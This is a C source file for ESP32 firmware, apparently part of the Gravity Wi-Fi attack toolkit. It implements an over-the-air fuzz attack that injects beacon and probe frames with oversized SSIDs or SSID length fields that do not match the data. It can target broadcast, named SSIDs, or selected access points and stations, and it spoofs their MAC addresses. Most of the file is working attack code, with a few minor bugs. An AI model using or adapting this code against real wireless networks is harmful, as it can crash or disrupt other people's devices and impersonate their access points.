#include "fuzz.h"
#include "beacon.h"
#include "common.h"
#include "esp_err.h"

FuzzMode fuzzMode = FUZZ_MODE_OFF;
FuzzPacketType fuzzPacketType = FUZZ_PACKET_NONE;
FuzzTarget fuzzTarget = FUZZ_TARGET_BROADCAST;
static TaskHandle_t fuzzTask = NULL;

int fuzzCounter = 0;
#ifdef CONFIG_MALFORMED_FROM
    uint8_t malformedFrom = CONFIG_MALFORMED_FROM;
#else
    uint8_t malformedFrom = 16; /* Default at half the length */
#endif
bool firstCallback = true;
bool malformedPartOne = true;
/* Defines whether we used a sequence of random characters, rather
   than a sequence of random words.
*/

const char *FUZZ_TAG = "fuzz@GRAVITY";

esp_err_t fuzzTargetAsString(char *result) {
    if (result == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    switch (fuzzTarget) {
        case FUZZ_TARGET_BROADCAST:
            strcpy(result, "Broadcest");
            break;
        case FUZZ_TARGET_TARGET_SSIDS:
            strcpy(result, "Target-SSIDs");
            break;
        case FUZZ_TARGET_SELECTED_AP:
            strcpy(result, "SelectedAP");
            break;
        case FUZZ_TARGET_SELECTED_STA:
            strcpy(result, "SelectedSTA");
            break;
        case FUZZ_TARGET_RANDOM:
            strcpy(result, "Random");
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Unknown target %d\n", fuzzTarget);
            #else
                ESP_LOGE(FUZZ_TAG, "Unknown target found: %d", fuzzTarget);
            #endif
            result = "";
            return ESP_ERR_INVALID_ARG;
    }
    return ESP_OK;
}

/* Function may use up to 15 bytes of memory at the
   location specified by result */
esp_err_t fuzzModeAsString(char *result) {
    if (result == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    switch (fuzzMode) {
        case FUZZ_MODE_NONE:
            strcpy(result, "Inactive");
            break;
        case FUZZ_MODE_SSID_OVERFLOW:
            strcpy(result, "SSID Overflow");
            break;
        case FUZZ_MODE_SSID_MALFORMED:
            strcpy(result, "Malformed SSID");
            break;
        case FUZZ_MODE_OFF:
            strcpy(result, "Shutting Down");
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Unknown mode %d!\n", fuzzMode);
            #else
                ESP_LOGE(FUZZ_TAG, "Unknown mode found: %d", fuzzMode);
            #endif
            result = "";
            return ESP_ERR_INVALID_STATE;
    }
    return ESP_OK;
}

/* Function may use up to 38 bytes of memory at the
   location specified by result */
esp_err_t fuzzPacketTypeAsString(char *result) {
    if (result == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    strcpy(result, "");
    if (fuzzPacketType & FUZZ_PACKET_BEACON) {
        if (strlen(result) > 0) {
            strcat(result, ", ");
        }
        strcat(result, "Beacon");
    }
    if (fuzzPacketType & FUZZ_PACKET_PROBE_REQ) {
        if (strlen(result) > 0) {
            strcat(result, ", ");
        }
        strcat(result, "Probe Request");
    }
    if (fuzzPacketType & FUZZ_PACKET_PROBE_RESP) {
        if (strlen(result) > 0) {
            strcat(result, ", ");
        }
        strcat(result, "Probe Response");
    }
    return ESP_OK;
}

/* Set the base length of SSIDs using malformed mode */
/* Default is set to 16 as a default */
esp_err_t setMalformedSsidLength(int newLength) {
    if (newLength < 0) {
        ESP_LOGE(FUZZ_TAG, "Cannot specify a negative length.");
        return ESP_ERR_INVALID_ARG;
    }
    malformedFrom = newLength;
    return ESP_OK;
}

/* Generates a suitable packet for the SSID overflow attack */
/* Will generate any packet type defined in FuzzPacketType.
   Returns the size of the resulting packet, which will be 
   stored in outBytes upon conclusion. Caller must allocate memory
   Returns the length of the generated SSID.
*/
int fuzz_overflow_pkt(FuzzPacketType ptype, int ssidSize, FuzzTarget targetType, void *theTarget, uint8_t *outBytes) {
    uint8_t *packet_raw = NULL;
    int packet_len = 0;
    int thisSsidOffset = 0;
    int thisBssidOffset = 0;
    int thisSrcAddrOffset = 0;
    int thisDestAddrOffset = 0;
    switch (ptype) {
        case FUZZ_PACKET_BEACON:
            packet_raw = beacon_raw;
            packet_len = BEACON_PACKET_LEN;
            thisSsidOffset = BEACON_SSID_OFFSET;
            thisBssidOffset = BEACON_BSSID_OFFSET;
            thisSrcAddrOffset = BEACON_SRCADDR_OFFSET;
            thisDestAddrOffset = BEACON_DESTADDR_OFFSET;
            break;
        case FUZZ_PACKET_PROBE_REQ:
            packet_raw = probe_raw;
            packet_len = PROBE_REQUEST_LEN;
            thisSsidOffset = PROBE_SSID_OFFSET;
            thisBssidOffset = PROBE_BSSID_OFFSET;
            thisSrcAddrOffset = PROBE_SRCADDR_OFFSET;
            thisDestAddrOffset = PROBE_DESTADDR_OFFSET;
            break;
        case FUZZ_PACKET_PROBE_RESP:
            packet_raw = probe_response_raw;
            packet_len = PROBE_RESPONSE_LEN;
            thisSsidOffset = PROBE_RESPONSE_SSID_OFFSET;
            thisBssidOffset = PROBE_RESPONSE_BSSID_OFFSET;
            thisSrcAddrOffset = PROBE_RESPONSE_SRC_ADDR_OFFSET;
            thisDestAddrOffset = PROBE_RESPONSE_DEST_ADDR_OFFSET;
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Invalid packet type: %d\n", ptype);
            #else
                ESP_LOGE(FUZZ_TAG, "Invalid packet type encountered: %d", ptype);
            #endif
            return 0;
    }

    /* Construct our packet in-place in outBytes */
    memcpy(outBytes, packet_raw, thisSsidOffset - 1);
    outBytes[thisSsidOffset - 1] = (uint8_t)ssidSize; /* ssid_len */
    /* Allocate space for an SSID of the required length */
    char *ssid = malloc(sizeof(char) * (ssidSize + 1)); /* Other callers may want to use it as a string */
    if (ssid == NULL) {
        #ifdef CONFIG_FLIPPER
            printf("%s(%db) for an SSID\n", STRINGS_MALLOC_FAIL, ssidSize);
        #else
            ESP_LOGE(FUZZ_TAG, "%s(%d bytes) for an SSID", STRINGS_MALLOC_FAIL, ssidSize);
        #endif
        return 0;
    }
    esp_err_t err = ESP_OK;
    /* If a valid target has been provided, use its attributes */
    /* TODO: Much of this should act on the instance of the packet, near the bottom of the function.
             I started here in order to control SSIDs and then just sort of got carried away.
       This is a refactor worth doing.
       IDIOT just change packet_raw to outByte! :'(
    */
    switch (targetType) {
        case FUZZ_TARGET_BROADCAST:
        case FUZZ_TARGET_RANDOM:
            /* Generate a random SSID of the required size */
            if (scrambledWords) {
                err |= randomSsidWithChars(ssid, ssidSize);
            } else {
                err |= randomSsidWithWords(ssid, ssidSize);
            }
            /* Set probe response destAddr to broadcast if needed */
            if (targetType == FUZZ_TARGET_BROADCAST && ptype == FUZZ_PACKET_PROBE_RESP) {
                memset(&(packet_raw[thisDestAddrOffset]), 0xFF, 6);
            }
            break;
        case FUZZ_TARGET_SELECTED_AP:
            ScanResultAP *thisAP = (ScanResultAP *)theTarget;
            /* Use the APs MAC as destAddr for probe requests */
            if (ptype == FUZZ_PACKET_PROBE_REQ) {
                memcpy(&(packet_raw[thisDestAddrOffset]), thisAP->espRecord.bssid, 6);
            } else if (ptype == FUZZ_PACKET_PROBE_RESP) {
                /* Use APs MAC as BSSID and srcAddr for probe responses */
                memcpy(&(packet_raw[thisBssidOffset]), thisAP->espRecord.bssid, 6);
                memcpy(&(packet_raw[thisSrcAddrOffset]), thisAP->espRecord.bssid, 6);
            }
            /* Use the AP's SSID */
            if (scrambledWords) {
                err |= extendSsidWithChars(ssid, (char *)thisAP->espRecord.ssid, ssidSize);
            } else {
                err |= extendSsidWithWords(ssid, (char *)thisAP->espRecord.ssid, ssidSize);
            }
            memcpy(&(packet_raw[thisSsidOffset]), ssid, ssidSize);
            break;
        case FUZZ_TARGET_TARGET_SSIDS:
            char *thisSsid = (char *)theTarget;
            /* Use the specified SSID, expanded to meet length requirements if necessary */
            if (scrambledWords) {
                err |= extendSsidWithChars(ssid, thisSsid, ssidSize);
            } else {
                err |= extendSsidWithWords(ssid, thisSsid, ssidSize);
            }
            memcpy(&(packet_raw[thisSsidOffset]), ssid, ssidSize);
            break;
        case FUZZ_TARGET_SELECTED_STA:
            ScanResultSTA *thisSTA = (ScanResultSTA *)theTarget;
            /* Set srcAddr regardless of packet type */
            memcpy(&(packet_raw[thisSrcAddrOffset]), thisSTA->mac, 6);
            /* Set BSSID for beacon and probe response packets */
            if (ptype == FUZZ_PACKET_BEACON || ptype == FUZZ_PACKET_PROBE_RESP) {
                memcpy(&(packet_raw[thisBssidOffset]), thisSTA->mac, 6);
            }
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Warning: Unknown target specifier (%d).\n", targetType);
            #else
                ESP_LOGW(FUZZ_TAG, "Unrecognised target specifier (%d).", targetType);
            #endif
            break;
    }

    /* Generate a random SSID of the required length */
    if (err != ESP_OK) {
        #ifdef CONFIG_FLIPPER
            printf("Failed to generate an SSID!\n");
        #else
            ESP_LOGE(FUZZ_TAG, "Failed to generate an SSID of length %d", ssidSize);
        #endif
        free(ssid);
        return 0;
    }
    memcpy(&outBytes[thisSsidOffset], (uint8_t *)ssid, ssidSize);

    /* Finish the packet */
    memcpy(&outBytes[thisSsidOffset + ssidSize], &packet_raw[thisSsidOffset], packet_len - thisSsidOffset);

    return packet_len + ssidSize;
}

/* Generates packets for the Malformed SSID attack */
/* Will generate any packet type defined in FuzzPacketType.
   Returns the size of the resulting packet, which will be 
   stored in outBytes upon conclusion. Caller must allocate memory */
int fuzz_malformed_pkt(FuzzPacketType ptype, int ssidSize, uint8_t *outBytes) {
    uint8_t *packet_raw = NULL;
    int packet_len = 0;
    int thisSsidOffset = 0;
    int thisBssidOffset = 0;
    int thisSrcAddrOffset = 0;
    int thisDestAddrOffset = 0;

    switch (ptype) {
        case FUZZ_PACKET_BEACON:
            packet_raw = beacon_raw;
            packet_len = BEACON_PACKET_LEN;
            thisSsidOffset = BEACON_SSID_OFFSET;
            thisBssidOffset = BEACON_BSSID_OFFSET;
            thisSrcAddrOffset = BEACON_SRCADDR_OFFSET;
            thisDestAddrOffset = BEACON_DESTADDR_OFFSET;
            break;
        case FUZZ_PACKET_PROBE_REQ:
            packet_raw = probe_raw;
            packet_len = PROBE_REQUEST_LEN;
            thisSsidOffset = PROBE_SSID_OFFSET;
            thisBssidOffset = PROBE_BSSID_OFFSET;
            thisSrcAddrOffset = PROBE_SRCADDR_OFFSET;
            thisDestAddrOffset = PROBE_DESTADDR_OFFSET;
            break;
        case FUZZ_PACKET_PROBE_RESP:
            packet_raw = probe_response_raw;
            packet_len = PROBE_RESPONSE_LEN;
            thisSsidOffset = PROBE_RESPONSE_SSID_OFFSET;
            thisBssidOffset = PROBE_RESPONSE_BSSID_OFFSET;
            thisSrcAddrOffset = PROBE_RESPONSE_SRC_ADDR_OFFSET;
            thisDestAddrOffset = PROBE_RESPONSE_DEST_ADDR_OFFSET;
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Invalid Packet Type \"%d\"\n", ptype);
            #else
                ESP_LOGE(FUZZ_TAG, "Encountered an invalid Packet Type, '%d'", ptype);
            #endif
            return 0;
    }

    /* Start by copying packet_raw up to SSID_len */
    memcpy(outBytes, packet_raw, thisSsidOffset - 1);
    /* What's the length we're reporting as ssid_len ? */
    outBytes[thisSsidOffset - 1] = malformedFrom;

    /* Allocate space for an SSID with our actual length */
    char *ssid = malloc(sizeof(char) * (ssidSize + 1)); /* Other callers may want to use it as a string */
    if (ssid == NULL) {
        #ifdef CONFIG_FLIPPER
            printf("%s(%db) for an SSID\n", STRINGS_MALLOC_FAIL, (ssidSize + 1));
        #else
            ESP_LOGE(FUZZ_TAG, "%s(%d bytes) for an SSID", STRINGS_MALLOC_FAIL, (ssidSize + 1));
        #endif
        return 0;
    }
    /* Generate a random SSID of the required length */
    if (randomSsidWithWords(ssid, ssidSize) != ESP_OK) {
        #ifdef CONFIG_FLIPPER
            printf("Failed to generate an SSID!\n");
        #else
            ESP_LOGE(FUZZ_TAG, "Failed to generate an SSID of length %d", ssidSize);
        #endif
        free(ssid);
        return 0;
    }
    /* Append SSID to our packet */
    memcpy(&outBytes[thisSsidOffset], ssid, ssidSize);
    /* And the end */
    memcpy(&outBytes[thisSsidOffset + ssidSize], &packet_raw[thisSsidOffset], packet_len - thisSsidOffset);

    return (packet_len + ssidSize);
}

/* Implementation of malformed mode */
/* This process will alternate between sending packets longer than expected
   and shorter than expected. For example, with a starting length of 16,
   Gravity will send packets with lengths 17, 15, 18, 14, etc.
*/
void fuzz_malformed_callback(void *pvParameter) {
    if (firstCallback) {
        firstCallback = false;
        fuzzCounter = 0;
        malformedPartOne = true;
    }
    /* Allocate space for the packet */
    int biggestPktLen = max(BEACON_PACKET_LEN, max(PROBE_REQUEST_LEN, PROBE_RESPONSE_LEN)) + max(MAX_SSID_LEN, (fuzzCounter + malformedFrom));
    uint8_t *pkt = malloc(sizeof(uint8_t) * biggestPktLen);
    if (pkt == NULL) {
        #ifdef CONFIG_FLIPPER
            printf("%sfor universal packet\n", STRINGS_MALLOC_FAIL);
        #else
            ESP_LOGE(FUZZ_TAG, "%s(%d bytes) for a universal packet", STRINGS_MALLOC_FAIL, biggestPktLen);
        #endif
        return;
    }
    /* SSID length will be malformedFrom +/- fuzzCounter. If (malformedPartOne) we add fuzzCounter.
       If !malformedFrom we subtract. */
    int ssidLen = malformedFrom;
    if (malformedPartOne) {
        ssidLen += fuzzCounter;
    } else {
        ssidLen -= fuzzCounter;
        if (ssidLen < 0) {
            ssidLen = 0;
        }
    }
    /* Generate a packet of the required type and SSID */
    int pkt_len = fuzz_malformed_pkt(fuzzPacketType, ssidLen, pkt);

    /* TODO: Set BSSID, SRCADDR, DESTADDR */

    esp_wifi_80211_tx(WIFI_IF_AP, pkt, pkt_len, true);

    /* Prepare for the next cycle */
    if (malformedPartOne) {
        malformedPartOne = false;
    } else {
        malformedPartOne = true;
        ++fuzzCounter;
    }

    free(pkt);
}

/* Implementation of overflow mode */
void fuzz_overflow_callback(void *pvParameter) {
    if (firstCallback) {
        fuzzCounter = MAX_SSID_LEN + 1;
        firstCallback = false;
    }
    /* How much space do we need to allocate for the packet? */
    int biggestPktLen = max(BEACON_PACKET_LEN, max(PROBE_REQUEST_LEN, PROBE_RESPONSE_LEN)) + max(MAX_SSID_LEN, fuzzCounter);
    uint8_t *pkt = malloc(sizeof(uint8_t) * biggestPktLen);
    if (pkt == NULL) {
        #ifdef CONFIG_FLIPPER
            printf("%sfor universal packet\n", STRINGS_MALLOC_FAIL);
        #else
            ESP_LOGE(FUZZ_TAG, "%s(%d bytes) for a universal packet template", STRINGS_MALLOC_FAIL, biggestPktLen);
        #endif
        return;
    }

    /* Check fuzzTarget to determine how/how many packets to send */
    void *targetObject = NULL;
    uint8_t targetCount = 0;
    int targetElemSize = 0;
    switch (fuzzTarget) {
        case FUZZ_TARGET_BROADCAST:
            #ifdef CONFIG_DEBUG
                #ifdef CONFIG_FLIPPER
                    printf("Generating BROADCAST\noverflow packet.\n");
                #else
                    ESP_LOGI(FUZZ_TAG, "Generating BROADCAST overflow packet.");
                #endif
            #endif
            break;
        case FUZZ_TARGET_RANDOM:
            #ifdef CONFIG_DEBUG
                #ifdef CONFIG_FLIPPER
                    printf("Generating RANDOM overflow pkt.\n");
                #else
                    ESP_LOGI(FUZZ_TAG, "Generating RANDOM overflow packet.");
                #endif
            #endif
            break;
        case FUZZ_TARGET_TARGET_SSIDS:
            targetObject = lsSsid();
            targetCount = countSsid();
            targetElemSize = sizeof(char *);
            #ifdef CONFIG_DEBUG
                #ifdef CONFIG_FLIPPER
                    printf("Using %u Target-SSIDs\nfor overflow packets.\n", targetCount);
                #else
                    ESP_LOGI(FUZZ_TAG, "Using %u Target-SSIDs for overflow packets.", targetCount);
                #endif
            #endif
            break;
        case FUZZ_TARGET_SELECTED_AP:
            targetObject = gravity_selected_aps;
            targetCount = gravity_sel_ap_count;
            targetElemSize = sizeof(ScanResultAP *);
            #ifdef CONFIG_DEBUG
                #ifdef CONFIG_FLIPPER
                    printf("Using %u selected APs\nfor overflow packets.\n", targetCount);
                #else
                    ESP_LOGI(FUZZ_TAG, "Using %u selected APs for overflow packets.", targetCount);
                #endif
            #endif
            break;
        case FUZZ_TARGET_SELECTED_STA:
            targetObject = gravity_selected_stas;
            targetCount = gravity_sel_sta_count;
            targetElemSize = sizeof(ScanResultSTA *);
            #ifdef CONFIG_DEBUG
                #ifdef CONFIG_FLIPPER
                    printf("Using %u selected STAs\nfor overflow packets.\n", targetCount);
                #else
                    ESP_LOGI(FUZZ_TAG, "Using %u selected STAs for overflow packets.", targetCount);
                #endif
            #endif
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Unknown target specifier (%d).\n", fuzzTarget);
            #else
                ESP_LOGE(FUZZ_TAG, "Unknown target specifier (%d), halting.", fuzzTarget);
            #endif
            free(pkt);
            /* YAGNI This is probably a terrible way to go about it, but better than the gobbledygook
               error that's displayed if you return from this thread
            */
            fuzz_stop();
    }

    /* Depending on the target specifier we may need to generate and send multiple packets */
    int pkt_len = 0;
    for (uint8_t targetIdx = 0; targetIdx < targetCount; ++targetIdx) {
        /* Considering the merits of processing targets here vs. inside fuzz_overflow_pkt()
           doing it here will be quicker and easier, but also a bit of a kludge, and would
           make future enhancements, such as supporting additional packet types, much harder
           to accommodate.
        */
        // New sig: puzz_overflow_pkt(fuzzPacketType, fuzzCounter, fuzzTarget, *targetObj)
        // fuzzTarget shares the target type, allowing targetObj to be translated into:
        // BROADCAST/RANDOM: NULL (Random refers to SSID name only)
        // TARGET-SSIDs: char* for the current iteration
        // SelectedAP: ScanResultAP* for the current iteration
        // SelectedSTA: ScanResultSTA* for the current iteration

        /* targetObject currently contains the arrays containing all targets, extract the
           target at element targetIdx.
           Because targetObject is a void* the compiler has no way of knowing the size of
           elements - targetObject[targetIdx] will have undefined, but certainly undesirable,
           behaviour. Use targetElemSize to find the memory address of the target in question:
        */
        void *thisTarget = targetObject + (targetIdx * targetElemSize);

        /* Generate a packet of the specified type with an appropriate SSID */
        pkt_len = fuzz_overflow_pkt(fuzzPacketType, fuzzCounter, fuzzTarget, thisTarget, pkt);
//        pkt_len = fuzz_overflow_pkt(fuzzPacketType, fuzzCounter, pkt);

        esp_wifi_80211_tx(WIFI_IF_AP, pkt, pkt_len, true);

    }

    ++fuzzCounter;
    free(pkt);
}

/* Master event loop */
void fuzzCallback(void *pvParameter) {
    //
    while (1) {
        vTaskDelay((ATTACK_MILLIS / portTICK_PERIOD_MS) + 1);

        if (!attack_status[ATTACK_FUZZ]) {
            continue; /* Exit this loop iteration */
        }

        if (fuzzMode == FUZZ_MODE_SSID_OVERFLOW) {
            fuzz_overflow_callback(pvParameter);
        } else if (fuzzMode == FUZZ_MODE_SSID_MALFORMED) {
            fuzz_malformed_callback(pvParameter);
        }
    }
}

esp_err_t fuzz_start(FuzzMode newMode, FuzzPacketType newType, FuzzTarget newTarget) {
    fuzzMode = newMode;
    fuzzPacketType = newType;
    fuzzTarget = newTarget;
    fuzzCounter = 0;
    firstCallback = true;
    malformedPartOne = true;

    /* If Fuzz is already running stop it first */
    if (fuzzTask != NULL) {
        fuzz_stop();
    }

    // And initialise the random number generator
	srand(time(NULL));


    xTaskCreate(&fuzzCallback, "fuzzCallback", 2048, NULL, 5, &fuzzTask);

    return ESP_OK;
}

esp_err_t fuzz_stop() {
    fuzzCounter = 0;
    if (fuzzTask != NULL) {
        vTaskDelete(fuzzTask);
        fuzzTask = NULL;
    }
    return ESP_OK;
}